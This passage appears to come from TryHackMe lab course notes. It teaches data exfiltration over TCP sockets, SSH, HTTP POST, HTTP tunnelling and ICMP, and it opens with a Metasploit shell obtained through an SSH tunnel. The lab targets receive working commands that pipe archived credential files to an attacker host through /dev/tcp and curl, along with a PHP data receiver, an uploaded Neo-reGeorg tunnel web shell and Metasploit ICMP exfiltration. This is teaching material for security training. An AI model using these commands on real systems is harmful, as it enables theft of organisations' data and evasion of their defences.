- Our exploit must also run a web server to host and send the final payload back to the victim server. We use **SRVHOST** to indicate the listening address, which in this case is 127.0.0.1, so
that the attacker machine binds the webserver to localhost. While this
might be counterintuitive, as no external host would be able to point to the attacker's machine localhost, the SSH tunnel will take care of forwarding any connection received on THMJMP2 at SRVPORT back to the attacker's machine.
- The **RHOSTS** is set to point to 127.0.0.1 as the SSH tunnel will forward the requests to THMDC through the SSH tunnel established with THMJMP2. RPORT is set to 8888, as any connection sent to that port on the attacker machine will be forwarded to port 80 on THMDC.

After launching the exploit, you will receive a shell back at the attacker's machine. You will find a flag on `C:\hfs\flag.txt`.

**DATA EXFILTRATION**

# What is Data Exfiltration

Data
 Exfiltration is the process of taking an unauthorized copy of sensitive
 data and moving it from the inside of an organization's network to the 
outside. It is important to note that Data Exfiltration is a 
post-compromised process where a threat actor has already gained access 
to a network and performed various activities to get hands on sensitive 
data. Data Exfiltration often happens at the last stage of the Cyber Kill Chain model, Actions on Objectives.

![https://tryhackme-images.s3.amazonaws.com/user-uploads/5d617515c8cd8348d0b4e68f/room-content/c2b48bf0b212e640b259a3405c2391b1.png](https://tryhackme-images.s3.amazonaws.com/user-uploads/5d617515c8cd8348d0b4e68f/room-content/c2b48bf0b212e640b259a3405c2391b1.png)

Data exfiltration is also used to hide an adversary's malicious activities and bypass security products. For example, the DNS exfiltration technique can evade security products, such as a firewall.

Sensitive data can be in various types and forms, and it may contain the following:

- Usernames and passwords or any authentication information.
- Bank accounts details
- Business strategic decisions.
- Cryptographic keys.
- Employee and personnel information.
- Project code data.

# How to use Data Exfiltration

There are three primary use case scenarios of data exfiltration, including:

1. Exfiltrate data
2. Command and control communications.
3. Tunneling

**Traditional Data Exfiltration**

![https://tryhackme-images.s3.amazonaws.com/user-uploads/5d617515c8cd8348d0b4e68f/room-content/0c3438995ccff35a5589b9abd3703b14.png](https://tryhackme-images.s3.amazonaws.com/user-uploads/5d617515c8cd8348d0b4e68f/room-content/0c3438995ccff35a5589b9abd3703b14.png)

The
 traditional Data Exfiltration scenario is moving sensitive data out of 
the organization's network. An attacker can make one or more network 
requests to transfer the data, depending on the data size and the 
protocol used.
 Note that a threat actor does not care about the reply or response to 
his request. Thus, all traffic will be in one direction, from inside the
 network to outside. Once the data is stored on the attacker's server, 
he logs into it and grabs the data.

**C2 Communications**

![https://tryhackme-images.s3.amazonaws.com/user-uploads/5d617515c8cd8348d0b4e68f/room-content/49ad248f2506a5a749dbb70732c32072.png](https://tryhackme-images.s3.amazonaws.com/user-uploads/5d617515c8cd8348d0b4e68f/room-content/49ad248f2506a5a749dbb70732c32072.png)

Many C2
 frameworks provide options to establish a communication channel, 
including standard and non-traditional protocols to send commands and 
receive responses from a victim machine. In C2 communications a limited 
number of requests where an attacker sends a request to execute a 
command in the victim's machine. Then, the agent's client executes the 
command and sends a reply with the result over a non-traditional 
protocol. The communications will go in two directions: into and out of 
the network.

**Tunneling**

![https://tryhackme-images.s3.amazonaws.com/user-uploads/5d617515c8cd8348d0b4e68f/room-content/b4c99b2aba13eac24379fee2d20ffbf6.png](https://tryhackme-images.s3.amazonaws.com/user-uploads/5d617515c8cd8348d0b4e68f/room-content/b4c99b2aba13eac24379fee2d20ffbf6.png)

In
 the Tunneling scenario, an attacker uses this data exfiltration 
technique to establish a communication channel between a victim and an 
attacker's machine. The communication channel acts as a bridge to let 
the attacker machine access the entire internal network. There will be 
continuous traffic sent and received while establishing the connection.

In the coming tasks, we will discuss the following techniques and use cases:

- Exfiltrate using TCP socket and Base64
- Exfiltrate using SSH
- Exfiltrate using HTTPS (POST request)
- ICMP
- DNS

**Exfiltration using TCP socket**

This task shows how to exfiltrate data over TCP using data encoding. Using the TCP socket is one of the data exfiltration techniques that an attacker may use in a non-secured environment where they know there are no network-based security products. If we are in a well-secured environment, then this kind of exfiltration is not recommended. This exfiltration type is easy to detect because we rely on non-standard protocols.

Besides the TCP
 socket, we will also use various other techniques, including data 
encoding and archiving. One of the benefits of this technique is that it
 encodes the data during transmission and makes it harder to examine.

The following diagram explains how traditional communications over TCP
 work. If two machines want to communicate, then one of them has to 
listen and wait for the incoming traffic. It is similar to how two 
people talk and communicate, where one of them is listening, and the 
other person is speaking.

![https://tryhackme-images.s3.amazonaws.com/user-uploads/5d617515c8cd8348d0b4e68f/room-content/9931b598f5757bbdfb74004a2a43fe16.png](https://tryhackme-images.s3.amazonaws.com/user-uploads/5d617515c8cd8348d0b4e68f/room-content/9931b598f5757bbdfb74004a2a43fe16.png)

The diagram shows that two hosts communicate over TCP on port 1337 in the following steps:

1. The first machine is listening over TCP on port **1337**
2. The other machine connects to the port specified in step 1. For example, **nc 1.2.3.4 1337**
3. The first machine establishes the connection
4. Finally, the sending and receiving data starts. For example, the attacker sends commands and receives results.

Communication over TCP
 requires two machines, one victim and one attacker machine, to transfer
 data. Let's use our network environment to practice sending data over 
TCP. To establish communication over TCP, we require two machines: the victim1.thm.com machine is the victim and the JumpBox, jump.thm.com, is the attacker's machine.

First, we need to prepare a listener on the **JumpBox** on a port you specify. In our case, we choose port 8080.

Listening on port TCP/8080 in the JumpBox

```markup
thm@jump-box$ nc -lvp 8080 > /tmp/task4-creds.data
Listening on [0.0.0.0] (family 0, port 8080)

```

From the previous command, we used the nc command to receive data on port 8080. Then, once we receive the data, we store it in the /tmp/ directory and call it task4-creds.data as a filename.

Now let's connect to our victim machine that contains the data that needs to be transmitted using the following credential: thm:tryhackme. Note that to connect to the victim1 from the JumpBox, we can use the internal domain name as follows,

Connect to the victim from the JumpBox

```markup
thm@jump-box$ ssh thm@victim1.thm.com
```

We can also connect directly from the AttackBox using port 2022 as follows,

Connect to the victim from the AttackBox

```markup
root@AttackBox$ ssh thm@MACHINE_IP -p 2022
```

We have the required data ready to be transmitted on the victim 
machine. In this case, we have a sample file with a couple of 
credentials.

Checking the creds.txt file on the victim machine

```markup
thm@victim1:~$ cat task4/creds.txt
admin:password
Admin:123456
root:toor
```

Now that we have the credential text file, we will use the TCP socket to exfiltrate it. **Make sure the listener is running on the JumpBox**.

Exfiltrate Data over TCP Socket from the victim machine!

```markup
thm@victim1:$ tar zcf - task4/ | base64 | dd conv=ebcdic > /dev/tcp/192.168.0.133/8080
0+1 records in
0+1 records out
260 bytes copied, 9.8717e-05 s, 2.6 MB/s
```

Let's break down the previous command and explain it:

1. We used the tar command to create an archive file with the zcf arguments of the content of the secret directory.
2. The z is for using gzip to compress the selected folder, the c is for creating a new archive, and the f is for using an archive file.
3. We then passed the created tar file to the base64 command for converting it to base64 representation.
4. Then, we passed the result of the base64 command to create and copy a backup file with the dd command using EBCDIC encoding data.
5. Finally, we redirect the dd command's output to transfer it using the TCP socket on the specified IP and port, which in this case, port 8080.

Note that we used the Base64 and EBCDIC encoding to protect the data 
during the exfiltration. If someone inspects the traffic, it would be in
 a non-human readable format and wouldn't reveal the transmitted file 
type.

Once we hit enter, we should receive the encoded data in the /tmp/ directory.

Checking the received data on the JumpBox

```markup
thm@jump-box$ nc -lvp 8080 > /tmp/task4-creds.data
Listening on [0.0.0.0] (family 0, port 8080)
Connection from 192.168.0.101 received!

thm@jump-box$ ls -l /tmp/
-rw-r--r-- 1 root root       240 Apr  8 11:37 task4-creds.data
```

On the JumpBox, we need to convert the received data back to its original status. We will be using the dd tool to convert it back.

Restoring the tar file

```markup
thm@jump-box$ cd /tmp/
thm@jump-box:/tmp/$ dd conv=ascii if=task4-creds.data |base64 -d > task4-creds.tar
0+1 records in
0+1 records out
260 bytes transferred in 0.000321 secs (810192 bytes/sec)
```

The following is the explanation of the previous command:

1. We used the dd command to convert the received file to ASCII representation. We used the task4-creds.data as input to the dd command.
2. The output of the dd command will be passed to the base64 to decode it using the -d argument.
3. Finally, we save the output in the task4-creds.tar file.

Next, we need to use the tar command to unarchive the task4-creds.tar file and check the content as follows,

Uncompressing the tar file

```markup
thm@jump-box$ tar xvf task4-creds.tar
task4/
task4/creds.txt
```

Let's break down the previous command and explain it:

1. We used the tar command to unarchive the file with the xvf arguments.
2. The x is for extracting the tar file, the v for verbosely listing files, and the f is for using an archive file.

Now let's confirm that we have the same data from the victim machine.

Confirming the received data

```markup
thm@jump-box$ cat task4/creds.txt
admin:password
Admin:123456
root:toor
```

Success! We exfiltrated data from a victim machine to an attacker machine using the TCP socket in this task.

**Exfiltration using SSH**

In this task we will show how to use SSH
 protocol to exfiltrate data over to an attacking machine. SSH protocol 
establishes a secure channel to interact and move data between the 
client and server, so all transmission data is encrypted over the 
network or the Internet.

![https://tryhackme-images.s3.amazonaws.com/user-uploads/5d617515c8cd8348d0b4e68f/room-content/aa723bb0e2c39dfc936b135c4912d1cf.png](https://tryhackme-images.s3.amazonaws.com/user-uploads/5d617515c8cd8348d0b4e68f/room-content/aa723bb0e2c39dfc936b135c4912d1cf.png)

To transfer data over the SSH, we can use either the Secure Copy Protocol SCP or the SSH client. Let's assume that we don't have the SCP command available to transfer data over SSH. Thus, we will focus more on the SSH client in this task.

As we mentioned earlier, an attacker needs to control a server, which in this case has an SSH
 server enabled, to receive the exfiltrated data. Thus, we will be using
 the AttackBox as our SSH server in this scenario. You can also use the 
JumpBox since it has an SSH server enabled.

Let's assume that we have gained access to sensitive data that must be transmitted securely.  Let's connect to the victim1 or victim2 machine.

The data that needs to be transferred

```markup
thm@victim1:~$ cat task5/creds.txt
admin:password
Admin:123456
root:toor
```

Let's use the same technique we discussed in the "exfiltration using a TCP socket" task, where we will be using the tar command to archive the data and then transfer it.

Exfiltration data from the victim1 machine

```markup
thm@victim1:$ tar cf - task5/ | ssh thm@jump.thm.com "cd /tmp/; tar xpf -"
```

Let's break down the previous command and explain it:

1. We used the tar command the same as the previous task to create an archive file of the task5 directory.
2. Then we passed the archived file over the ssh. SSH clients provide a way to execute a single command without having a full session.
3. We passed the command that must be executed in double quotations, "cd /tmp/; tar xpf. In this case, we change the directory and unarchive the passed file.

If we check the attacker machine, we can see that we have successfully transmitted the file.

Checking the received data

```markup
thm@jump-box$ cd /tmp/task5/
thm@jump-box:/tmp/task5$ cat creds.txt
admin:password
Admin:123456
root:toor
```

**Exfiltrate using HTTP(S)**

Before going further, 
ensure that you have the fundamental knowledge of network protocols 
before diving into this task and the upcoming tasks.

This task 
explains how to use the HTTP/HTTPS protocol to exfiltrate data from a 
victim to an attacker's machine. As a requirement for this technique, an
 attacker needs control over a webserver with a server-side programming 
language installed and enabled. We will show a PHP-based scenario in 
this task, but it can be implemented in any other programming language, 
such as python, Golang, NodeJS, etc.

# HTTP

Exfiltration data through the HTTP
 protocol is one of the best options because it is challenging to 
detect. It is tough to distinguish between legitimate and malicious HTTP
 traffic. We will use the POST HTTP method in the data exfiltration, and
 the reason is with the GET request, all parameters are registered into 
the log file. While using POST request, it doesn't. The following are 
some of the POST method benefits:

- POST requests are never cached
- POST requests do not remain in the browser history
- POST requests cannot be bookmarked
- POST requests have no restrictions on **data length**

Let's login to theweb.thm.com machine using thm:tryhackme credentials and inspect the Apache log file with two HTTP requests, one for the GET and the other for the POST, and check what they look like!

Inspecting the Apache log file

```markup
thm@jump-box:~$ ssh thm@web.thm.com
thm@web-thm:~$ sudo cat /var/log/apache2/access.log
[sudo] password for thm:
10.10.198.13 - - [22/Apr/2022:12:03:11 +0100] "GET /example.php?file=dGhtOnRyeWhhY2ttZQo= HTTP/1.1" 200 147 "-" "curl/7.68.0"
10.10.198.13 - - [22/Apr/2022:12:03:25 +0100] "POST /example.php HTTP/1.1" 200 147 "-" "curl/7.68.0"
```

Obviously, the first line is a GET request with a file parameter with
 exfiltrated data. If you try to decode it using the based64 encoding, 
you would get the transmitted data, which in this case is thm:tryhackme. While the second request is a POST to example.php, we sent the same base64 data, but it doesn't show what data was transmitted.

The base64 data in your access.log looks different, doesn't it? Decode it to find the Flag for Question 1 below.

In
 a typical real-world scenario, an attacker controls a web server in the
 cloud somewhere on the Internet. An agent or command is executed from a
 compromised machine to send the data outside the compromised machine's 
network over the Internet into the webserver. Then an attacker can log 
in to a web server to get the data, as shown in the following figure.

![https://tryhackme-images.s3.amazonaws.com/user-uploads/5d617515c8cd8348d0b4e68f/room-content/789a9a13d9977b11d11f53bb7dbb9f3a.png](https://tryhackme-images.s3.amazonaws.com/user-uploads/5d617515c8cd8348d0b4e68f/room-content/789a9a13d9977b11d11f53bb7dbb9f3a.png)

# HTTP

Based on the attacker configuration, we can set up either HTTP or HTTPS, the encrypted version of HTTP. We also need a PHP page that handles the POST HTTP request sent to the server.

We will be using the HTTP protocol (not the HTTPS) in our scenario. Now let's assume that an attacker controls the web.thm.com server, and sensitive data must be sent from the JumpBox or  victim1.thm.com machine in our Network 2 environment (192.168.0.0/24).

To exfiltrate data over the HTTP protocol, we can apply the following steps:

1. An attacker sets up a web server with a data handler. In our case, it will be web.thm.com and the contact.php page as a data handler.
2. A C2 agent or an attacker sends the data. In our case, we will send data using the curl command.
3. The webserver receives the data and stores it. In our case, the contact.php receives the POST request and stores it into /tmp.
4. The attacker logs into the webserver to have a copy of the received data.

Let's follow and apply what we discussed in the previous steps. Remember, since we are using the HTTP
 protocol, the data will be sent in cleartext. However, we will be using
 other techniques (tar and base64) to change the data's string format so
 that it wouldn't be in a human-readable format!

First, we prepared a webserver with a data handler for this task. The following code snapshot is of PHP code to handle POST requests via a file parameter and stores the received data in the /tmp directory as http.bs64 file name.

```php
<?php
if (isset($_POST['file'])) {
        $file = fopen("/tmp/http.bs64","w");
        fwrite($file, $_POST['file']);
        fclose($file);
   }
?>
```

Now from the **Jump** machine, connect to the victim1.thm.com machine via SSH to exfiltrate the required data over the HTTP protocol. Use the following SSH credentials: thm:tryhackme.

Connecting to Victim1 machine from Jump Box

```markup
thm@jump-box:~$ ssh thm@victim1.thm.com
```

You can also connect to it from AttackBox using port 2022 as follow,

Connecting to Victim1 machine from AttackBox

```markup
thm@attacker$ ssh thm@MACHINE_IP -p 2022
```

The goal is to transfer the folder's content, stored in /home/thm/task6, to another machine over the HTTP protocol.

Checking the Secret folder!

```markup
thm@victim1:~$ ls -l
total 12
drwxr-xr-x 1 root root 4096 Jun 19 19:44 task4
drwxr-xr-x 1 root root 4096 Jun 19 19:44 task5
drwxr-xr-x 1 root root 4096 Jun 19 19:44 task6
drwxr-xr-x 1 root root 4096 Jun 19 19:43 task9
```

Now that we have our data, we will be using the curl command to send an HTTP POST request with the content of the secret folder as follows,

Sending POST data via CURL

```markup
thm@victim1:~$ curl --data "file=$(tar zcf - task6 | base64)" http://web.thm.com/contact.php
```

We used the curl command with --data argument to send a POST request via the file parameter. Note that we created an archived file of the secret folder using the tar command. We also converted the output of the tar command into base64 representation.

Next, from the **victim1 or JumpBox** machine, let's log in to the webserver, web.thm.com, and check the /tmp directory if we have successfully transferred the required data. Use the following SSH credentials in order to login into the web: thm:tryhackme.

Checking the received data

```markup
thm@victim1:~$ ssh thm@web.thm.com
thm@web:~$ ls -l /tmp/
total 4
-rw-r--r-- 1 www-data www-data 247 Apr 12 16:03 http.bs64
thm@web:~$ cat /tmp/http.bs64
H4sIAAAAAAAAA 3ROw7CMBBFUddZhVcA/sYSHUuJSAoKMLKNYPkkgSriU1kIcU/hGcsuZvTysEtD<
WYua1Ch4P9fRss69dsZ4E6wNTiitlTdC qpTPZxz6ZKUIsVY3v379P6j8j3/8ejzqlyrrDgF3Dr3
On/XLvI3QVshVY1hlv48/64/7I bU5fzJaa 2c5XbazzbTOtvCkxpubbUwIAAAAAAAAAAAAAAAB4
5gZKZxgrACgAAA==
```

Nice! We have received the data, but if you look closely at the http.bs64 file, you can see it is broken base64. This happens due to the URL encoding over the HTTP. The + symbol has been replaced with empty spaces, so let's fix it using the sed command as follows,

Fixing the http.bs64 file!

```markup
thm@web:~$ sudo sed -i 's/ /+/g' /tmp/http.bs64
```

Using the sed command, we replaced the spaces with + characters to make it a valid base64 string!

Restoring the Data

```markup
thm@web:~$ cat /tmp/http.bs64 | base64 -d | tar xvfz -
tmp/task6/
tmp/task6/creds.txt
```

Finally, we decoded the base64 string using the base64 command with -d argument, then we passed the decoded file and unarchived it using the tar command.

# HTTPS Communications

In the previous section, we showed how to perform Data Exfiltration over the HTTP
 protocol which means all transmitted data is in cleartext. One of the 
benefits of HTTPS is encrypting the transmitted data using SSL keys 
stored on a server.

If
 you apply the same technique we showed previously on a web server with 
SSL enabled, then we can see that all transmitted data will be 
encrypted. We have set up our private HTTPS server to show what the 
transmitted data looks like. If you are interested in setting up your 
own HTTPS server, we suggest visiting the [Digital Ocean website](https://www.digitalocean.com/community/tutorials/how-to-create-a-self-signed-ssl-certificate-for-apache-in-ubuntu-18-04).

![https://tryhackme-images.s3.amazonaws.com/user-uploads/5d617515c8cd8348d0b4e68f/room-content/fbf6c90063102ca100ba8d544ba9d7f8.png](https://tryhackme-images.s3.amazonaws.com/user-uploads/5d617515c8cd8348d0b4e68f/room-content/fbf6c90063102ca100ba8d544ba9d7f8.png)

As shown in the screenshot, we captured the network traffic and it seems that all client and server communications on port 443 are encrypted.

# HTTP

Tunneling over the HTTP
 protocol technique encapsulates other protocols and sends them back and
 forth via the HTTP protocol. HTTP tunneling sends and receives many 
HTTP requests depending on the communication channel!

Before diving into HTTP
 tunneling details, let's discuss a typical scenario where many internal
 computers are not reachable from the Internet. For example, in our 
scenario, the uploader.thm.com server is reachable from the Internet and provides web services to everyone. However, the app.thm.com server runs locally and provides services only for the internal network as shown in the following figure:

![https://tryhackme-images.s3.amazonaws.com/user-uploads/5d617515c8cd8348d0b4e68f/room-content/92004a7c6a572f9680f0056b9aa88baa.png](https://tryhackme-images.s3.amazonaws.com/user-uploads/5d617515c8cd8348d0b4e68f/room-content/92004a7c6a572f9680f0056b9aa88baa.png)

In this section, we will create an HTTP
 tunnel communication channel to pivot into the internal network and 
communicate with local network devices through HTTP protocol. Let's say 
that we found a web application that lets us upload an HTTP tunnel agent
 file to a victim webserver, uploader.thm.com. Once we upload and connect to it, we will be able to communicate with app.thm.com.

For HTTP Tunneling, we will be using a [Neo-reGeorg](https://github.com/L-codes/Neo-reGeorg)
 tool to establish a communication channel to access the internal 
network devices. We have installed the tool in AttackBox, and it can be 
found in the following location:

Neo-reGeorg Path on AttackBox

```markup
root@AttackBox:/opt/Neo-reGeorg#
```

Next, we need to generate an encrypted client file to upload it to the victim web server as follows,

Generating encrypted Tunneling Clients with a selected password!

```markup
root@AttackBox:/opt/Neo-reGeorg# python3 neoreg.py generate -k thm

          "$$$$$$''  'M$  '$$$@m
        :$$$$$$$$$$$$$$''$$$$'
       '$'    'JZI'$$&  $$$$'
                 '$$$  '$$$$
                 $$$$  J$$$$'
                m$$$$  $$$$,
                $$$$@  '$$$$_          Neo-reGeorg
             '1t$$$$' '$$$$<
          '$$$$$$$$$$'  $$$$          version 3.8.0
               '@$$$$'  $$$$'
                '$$$$  '$$$@
             'z$$$$$$  @$$$
                r$$$   $$|
                '$$v c$$
               '$$v $$v$$$$$$$$$#
               $$x$$$$$$$$$twelve$$$@$'
             @$$$@L '    '<@$$$$$$$$`
           $$                 '$$$

    [ Github ] https://github.com/L-codes/neoreg

    [+] Mkdir a directory: neoreg_servers
    [+] Create neoreg server files:
       => neoreg_servers/tunnel.aspx
       => neoreg_servers/tunnel.ashx
       => neoreg_servers/tunnel.jsp
       => neoreg_servers/tunnel_compatibility.jsp
       => neoreg_servers/tunnel.jspx
       => neoreg_servers/tunnel_compatibility.jspx
       => neoreg_servers/tunnel.php
```

The previous command generates encrypted Tunneling clients with thm key in the neoreg_servers/ directory. Note that there are various extensions available, including PHP, ASPX, JSP, etc. In our scenario, we will be uploading the tunnel.php file via the uploader machine. To access the uploader machine, you can visit the following URL: http://MACHINE_IP/uploader or https://LAB_WEB_URL.p.thmlabs.com/uploader without the need for a VPN.

![https://tryhackme-images.s3.amazonaws.com/user-uploads/5d617515c8cd8348d0b4e68f/room-content/2445ab5b8bc971b51f8ebe3ffbd0c07d.png](https://tryhackme-images.s3.amazonaws.com/user-uploads/5d617515c8cd8348d0b4e68f/room-content/2445ab5b8bc971b51f8ebe3ffbd0c07d.png)

To upload the PHP file, use admin as the key to let you upload any files into the uploader.thm.com. Once we have uploaded the file, we can access it on the following URL: http://MACHINE_IP/uploader/files/tunnel.php.

Creating an HTTP Tunnel

```markup
root@AttackBox:/opt/Neo-reGeorg# python3 neoreg.py -k thm -u http://MACHINE_IP/uploader/files/tunnel.php
```

We need to use the neoreg.py to connect to the client and provide the key to decrypt the tunneling client. We also need to provide a URL to the PHP file that we uploaded on the uploader machine.

Once it is connected to the tunneling client, we are ready to use the tunnel connection as a proxy binds on our local machine, 127.0.0.1, on port 1080.

For example, if we want to access the app.thm.com, which has an internal IP address 172.20.0.121 on port 80, we can use the curl command with --socks5 argument.
 We can also use other proxy applications, such as ProxyChains, 
FoxyProxy, etc., to communicate with the internal network.

Access the app.thm.com machine via the HTTP Tunneling

```markup
root@AttackBox:~$ curl --socks5 127.0.0.1:1080 http://172.20.0.121:80
Welcome to APP Server!
```

The following diagram shows the traffic flow as it goes through the 
uploader machine and then communicates with the internal network 
devices, which in this case, is the App machine. Note that if we check 
the network traffic from the App machine, we see that the source IP 
address of incoming traffic comes from the uploader machine.

![https://tryhackme-images.s3.amazonaws.com/user-uploads/5d617515c8cd8348d0b4e68f/room-content/b32d6d9d9c3377acf155044204ec6982.png](https://tryhackme-images.s3.amazonaws.com/user-uploads/5d617515c8cd8348d0b4e68f/room-content/b32d6d9d9c3377acf155044204ec6982.png)

Now replicate the HTTP Tunneling steps to establish tunneling over the HTTP protocol to communicate with flag.thm.com with 172.20.0.120 as an IP address on port 80. Note that if you access the flag.thm.com website from other machines within the network, you won't get the flag.

Exfiltration using ICMP

In this task, we will be showing how to exfiltrate data using the ICMP protocol. ICMP stands for **I**nternet **C**ontrol **M**essage **P**rotocol,
 and it is a network layer protocol used to handle error reporting. If 
you need more information about ICMP and the fundamentals of computer 
networking, you may visit the following THM room: [What is Networking](https://tryhackme.com/room/whatisnetworking).

Network devices such as routers use ICMP protocol
 to check network connectivities between devices. Note that the ICMP 
protocol is not a transport protocol to send data between devices. Let's say that two hosts need to test the connectivity in the network; then, we can use the ping command to send ICMP packets through the network, as shown in the following figure.

![https://tryhackme-images.s3.amazonaws.com/user-uploads/5d617515c8cd8348d0b4e68f/room-content/2a65a034de59c6e603a5a5f61fd7d909.png](https://tryhackme-images.s3.amazonaws.com/user-uploads/5d617515c8cd8348d0b4e68f/room-content/2a65a034de59c6e603a5a5f61fd7d909.png)

The HOST1 sends an ICMP packet with an **echo-request** packet. Then, if HOST2 is available, it sends an ICMP packet back with an **echo reply** message confirming the availability.

# ICMP Data Section

On a high level, the ICMP packet's structure contains a Data section
 that can include strings or copies of other information, such as the 
IPv4 header, used for error messages. The following diagram shows the Data section, which is optional to use.

![https://tryhackme-images.s3.amazonaws.com/user-uploads/5d617515c8cd8348d0b4e68f/room-content/38e7df5e059ece4c2567bd7f77421b22.png](https://tryhackme-images.s3.amazonaws.com/user-uploads/5d617515c8cd8348d0b4e68f/room-content/38e7df5e059ece4c2567bd7f77421b22.png)

Note that the Data field is optional and could either be empty or it could contain a random string during the communications. As an attacker, we can use the ICMP structure to include our data within the Data section and send it via ICMP packet to another machine. The other machine must capture the network traffic with the ICMP packets to receive the data.

To perform manual ICMP data exfiltration, we need to discuss the ping command a bit more. The ping command is a network administrator software available in any operating system. It is used to check the reachability and availability by sending ICMP packets, which can be used as follows:

Sending one ICMP packet using the PING Command

```markup
thm@AttackBox$ ping MACHINE_IP -c 1
```

We choose to send one ICMP packet from Host 1, our AttackBox, to Host 2, the target machine, using the-c 1 argument from the previous command. Now let's examine the ICMP packet in Wireshark and see what the Data section looks like.

![https://tryhackme-images.s3.amazonaws.com/user-uploads/5d617515c8cd8348d0b4e68f/room-content/3e8367a535e3f7f4076986987b9e0dcd.png](https://tryhackme-images.s3.amazonaws.com/user-uploads/5d617515c8cd8348d0b4e68f/room-content/3e8367a535e3f7f4076986987b9e0dcd.png)

The Wireshark screenshot shows that the Data section has been 
selected with random strings. It is important to note that this section 
could be filled with the data that needs to be transferred to another 
machine.

The ping command in the Linux OS has an interesting ICMP option. With the -p argument, we can specify 16 bytes of data in hex representation to send through the packet. Note that the -p option is only available for Linux operating systems. We can confirm that by checking the ping's help manual page.

![https://tryhackme-images.s3.amazonaws.com/user-uploads/5d617515c8cd8348d0b4e68f/room-content/61d50ec683ddae6c2f52f532cc02f685.png](https://tryhackme-images.s3.amazonaws.com/user-uploads/5d617515c8cd8348d0b4e68f/room-content/61d50ec683ddae6c2f52f532cc02f685.png)

Let's say that we need to exfiltrate the following credentials thm:tryhackme. First, we need to convert it to its Hex representation and then pass it to the ping command using -p options as follows,

Using the xxd command to convert text to Hex

```markup
root@AttackBox$ echo "thm:tryhackme" | xxd -p
74686d3a7472796861636b6d650a
```

We used the xxd command to convert our string to Hex, and then we can use the ping command with the Hex value we got from converting the thm:tryhackme.

Send Hex using the ping command.

```markup
root@AttackBox$ ping MACHINE_IP -c 1 -p 74686d3a7472796861636b6d650a
```

We sent one ICMP packet using the ping command with thm:tryhackme Data. Let's look at the Data section for this packet in the Wireshark.

![https://tryhackme-images.s3.amazonaws.com/user-uploads/5d617515c8cd8348d0b4e68f/room-content/6a086470f770c67c0a07f9572088e5e1.png](https://tryhackme-images.s3.amazonaws.com/user-uploads/5d617515c8cd8348d0b4e68f/room-content/6a086470f770c67c0a07f9572088e5e1.png)

Excellent! We have successfully filled the ICMP's Data section with our data and manually sent it over the network using the ping command.

# ICMP Data Exfiltration

Now that we have the basic fundamentals of manually sending data over ICMP packets, let's discuss how to use Metasploit
 to exfiltrate data. The Metasploit framework uses the same technique 
explained in the previous section. However, it will capture incoming 
ICMP packets and wait for a Beginning of File (BOF) trigger value. Once 
it is received, it writes to the disk until it gets an End of File (EOF)
 trigger value. The following diagram shows the required steps for the 
Metasploit framework. Since we need the Metasploit Framework for this 
technique, then we need the AttackBox machine to perform this attack 
successfully.

![https://tryhackme-images.s3.amazonaws.com/user-uploads/5d617515c8cd8348d0b4e68f/room-content/b45715c44b5998fa9bf6a989b1e0d8d6.png](https://tryhackme-images.s3.amazonaws.com/user-uploads/5d617515c8cd8348d0b4e68f/room-content/b45715c44b5998fa9bf6a989b1e0d8d6.png)

Now from the **AttackBox**, let's set up the Metasploit framework by selecting the icmp_exfil module to make it ready to capture and listen for ICMP traffic. One of the requirements for this module is to set the BPF_FILTER option, which is based on TCPDUMP rules, to capture only ICMP packets and ignore any ICMP packets that have the source IP of the attacking machine as follows,

Set the BPF_FILTER in MSF

```markup
msf5 > use auxiliary/server/icmp_exfil
msf5 auxiliary(server/icmp_exfil) > set BPF_FILTER icmp and not src ATTACKBOX_IP
BPF_FILTER => icmp and not src ATTACKBOX_IP
```

We also need to select which network interface to listen to, eth0. Finally, executes run to start the module.

Set the interface in MSF

```markup
msf5 auxiliary(server/icmp_exfil) > set INTERFACE eth0
INTERFACE => eth0
msf5 auxiliary(server/icmp_exfil) > run

[*] ICMP Listener started on eth0 (ATTACKBOX_IP). Monitoring for trigger packet containing ^BOF
[*] Filename expected in initial packet, directly following trigger (e.g. ^BOFfilename.ext)
```

We prepared icmp.thm.com as a victim machine to complete the ICMP task with the required tools. From the JumpBox, log in to the icmp.thm.com using thm:tryhackme credentials.

We have preinstalled the [nping](https://nmap.org/nping/)
 tool, an open-source tool for network packet generation, response 
analysis, and response time measurement. The NPING tool is part of the 
NMAP suite tools.

First, we will send the BOF trigger from the ICMP machine so that the Metasploit framework starts writing to the disk.

Sending the Trigger Value from the Victim

```markup
thm@jump-box$ ssh thm@icmp.thm.com
thm@icmp-host:~# sudo nping --icmp -c 1 ATTACKBOX_IP --data-string "BOFfile.txt"

Starting Nping 0.7.80 ( https://nmap.org/nping ) at 2022-04-25 23:23 EEST
SENT (0.0369s) ICMP [192.168.0.121 > ATTACKBOX_IP Echo request (type=8/code=0) id=7785 seq=1] IP [ttl=64 id=40595 iplen=39 ]
RCVD (0.0376s) ICMP [ATTACKBOX_IP > 192.168.0.121 Echo reply (type=0/code=0) id=7785 seq=1] IP [ttl=63 id=12656 iplen=39 ]
RCVD (0.0755s) ICMP [ATTACKBOX_IP > 192.168.0.121 Echo reply (type=0/code=0) id=7785 seq=1] IP [ttl=31 id=60759 iplen=32 ]

Max rtt: 38.577ms | Min rtt: 0.636ms | Avg rtt: 19.606ms
Raw packets sent: 1 (39B) | Rcvd: 2 (71B) | Lost: 0 (0.00%)
Nping done: 1 IP address pinged in 1.06 seconds
```

We sent one ICMP packet using the nping command with --data-string argument. We specify the trigger value with the file name BOFfile.txt, set by default in the Metasploit framework. This could be changed from Metasploit if needed!

Now check the AttackBox terminal. If everything is set correctly, the Metasploit framework should identify the trigger value and wait for the data to be written to disk.

Let's start sending the required data and the end of the file trigger value from the ICMP machine.

Sending the Data and the End of the File Trigger Value

```markup
thm@icmp-host:~# sudo nping --icmp -c 1 ATTACKBOX_IP --data-string "admin:password"

Starting Nping 0.7.80 ( https://nmap.org/nping ) at 2022-04-25 23:23 EEST
SENT (0.0312s) ICMP [192.168.0.121 > ATTACKBOX_IP Echo request (type=8/code=0) id=14633 seq=1] IP [ttl=64 id=13497 iplen=42 ]
RCVD (0.0328s) ICMP [ATTACKBOX_IP > 192.168.0.121 Echo reply (type=0/code=0) id=14633 seq=1] IP [ttl=63 id=17031 iplen=42 ]
RCVD (0.0703s) ICMP [ATTACKBOX_IP > 192.168.0.121 Echo reply (type=0/code=0) id=14633 seq=1] IP [ttl=31 id=41138 iplen=30 ]

Max rtt: 39.127ms | Min rtt: 1.589ms | Avg rtt: 20.358ms
Raw packets sent: 1 (42B) | Rcvd: 2 (72B) | Lost: 0 (0.00%)
Nping done: 1 IP address pinged in 1.06 seconds

